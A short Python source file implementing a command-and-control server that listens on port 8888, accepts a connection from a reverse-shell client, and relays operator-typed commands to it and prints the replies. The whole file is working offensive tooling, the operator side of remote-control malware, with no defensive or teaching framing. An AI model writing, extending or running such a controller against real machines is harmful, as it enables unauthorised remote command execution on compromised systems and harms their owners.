#!/usr/bin/python3.12
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, SHUT_RDWR


def run_cnc(server_ip='', port=8888):
    """Run Command & Control Server. Server IP has empty string which means that your OS use automatically
    your IP address. Bind port - 8888. Supports 1 connection.
    Server will be used to send and receive commands from Reverse Shell."""
    try:
        cnc_server = socket(AF_INET, SOCK_STREAM)
        cnc_server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        cnc_server.bind((server_ip, port))
        cnc_server.listen(1)
        print("---------------------------------------------------------------"
              "\n[!] CNC is now listening incoming connections..."
              "\n[!] Press CTRL + C to stop server.")

        rsh_connection, ip_client = cnc_server.accept()
        print(f"\n\t[+] Get connection from {ip_client[0]}:{ip_client[1]}\n")

        message = rsh_connection.recv(1024).decode()
        print(message)

        command = ''
        while command != 'quit':
            command = input("\tEnter a command: ")
            rsh_connection.send(command.encode())
            message = rsh_connection.recv(1024).decode()
            print(message)

        rsh_connection.shutdown(SHUT_RDWR)
        rsh_connection.close()

    except KeyboardInterrupt:
        print("\n\n[+] You have stopped CNC!"
              "\n---------------------------------------------------------------")


run_cnc()
